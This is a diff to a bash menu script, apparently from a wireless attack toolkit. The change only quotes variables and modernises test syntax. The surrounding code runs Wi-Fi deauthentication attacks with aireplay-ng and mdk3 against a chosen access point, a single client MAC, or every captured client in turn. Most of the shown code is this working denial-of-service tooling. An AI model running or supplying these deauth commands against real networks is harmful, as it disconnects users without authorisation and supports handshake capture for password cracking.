@@ -35,7 +35,7 @@ function option4
 		dlines=$((dlines-6))
 		clear
 		echo -e "Found $dlines clients."
-		if [ $dlines -gt 0 ]
+		if [[ "$dlines" -gt 0 ]]
 		then
 			n=0
 			while [ $n -lt $dlines ]
@@ -43,15 +43,15 @@ function option4
 			n=$((n+1))
 				n1=$((5+n))
 				MAC=$(cat $HANDFORDEAUTH | awk -v nn="$n1" '{FS=","}{if(NR==nn)print $1}')
-				if [[ $MAC = "" ]]
+				if [[ "$MAC" = "" ]]
 				then
 					echo -e "Empty MAC.Skipping..."
 					continue
 				fi
-				if [ -f /root/lscript/deauthtemp.txt ]
+				if [[ -f /root/lscript/deauthtemp.txt ]]
 				then
 					CHECKMAC=$(cat /root/lscript/deauthtemp.txt | awk -v n2="$MAC" '{if($0 ~ n2)print}')
-					if [[ $CHECKMAC != "" ]]
+					if [[ "$CHECKMAC" != "" ]]
 					then
 						echo -e "$MAC already being deauthed.Skipping..."
 						continue
@@ -77,7 +77,7 @@ do
 	echo -e ""$YS" 1"$CE") Deauth all                      aireplay-ng"
 	echo -e ""$YS" 2"$CE") Deauth all                      mdk3"
 	echo -e ""$YS" 3"$CE") Deauth client                   aireplay-ng"
-		if [[ $HANDF != 0 || $HANDF != "" ]]
+		if [[ "$HANDF" != 0 || "$HANDF" != "" ]]
 		then
 			echo -e ""$YS" 4"$CE") Deauth every client             aireplay-ng"
 		fi
@@ -87,11 +87,11 @@ do
 	fi
 	echo -e ""$YS" 0"$CE") EXIT"
 	read DT
-	if [[ $DT = 1 ]]
+	if [[ "$DT" = 1 ]]
 	then
 		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
 		read -e DEAUTHS
-		if [ -z $DEAUTHS ]
+		if [[ -z "$DEAUTHS" ]]
 		then
 			DEAUTHS=0
 		fi
@@ -99,13 +99,13 @@ do
 		export DEAUTHS
 		export TARGB
 		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash'
-	elif [[ $DT == "" ]]
+	elif [[ "$DT" == "" ]]
 	then
-		if [[ HANDFORDEAUTH != "" ]]
+		if [[ "$HANDFORDEAUTH" != "" ]]
 		then
-			if [[ LASTOPTIONS != "" ]]
+			if [[ "$LASTOPTIONS" != "" ]]
 			then
-				if [ LASTOPTIONS = 1 ]
+				if [[ "$LASTOPTIONS" = 1 ]]
 				then
 					option4
 				else
@@ -114,21 +114,21 @@ do
 			fi
 		fi
 	sleep 2
-	elif [[ $DT = 2 ]]
+	elif [[ "$DT" = 2 ]]
 	then
 		echo "$TARGB" > /root/mdk3bssid.txt
 		LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
 		export DEAUTHS
 		export TARGB
 		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
-	elif [[ $DT = 3 ]]
+	elif [[ "$DT" = 3 ]]
 	then
 		echo -e "Client's MAC: "
 		read -e TCC
 		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
 		read -e DEAUTHS
 		clear
-		if [ -z $DEAUTHS ]
+		if [[ -z "$DEAUTHS" ]]
 		then
 			DEAUTHS=0
 		fi
@@ -137,11 +137,11 @@ do
 		export TARGB
 		export TCC
 		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
-	elif [[ $DT = 4 ]]
+	elif [[ "$DT" = 4 ]]
 	then
 		LASTOPTIONS=1
 		option4
-	elif [[ $DT = 0 ]]
+	elif [[ "$DT" = 0 ]]
 	then
 		exit
 	fi
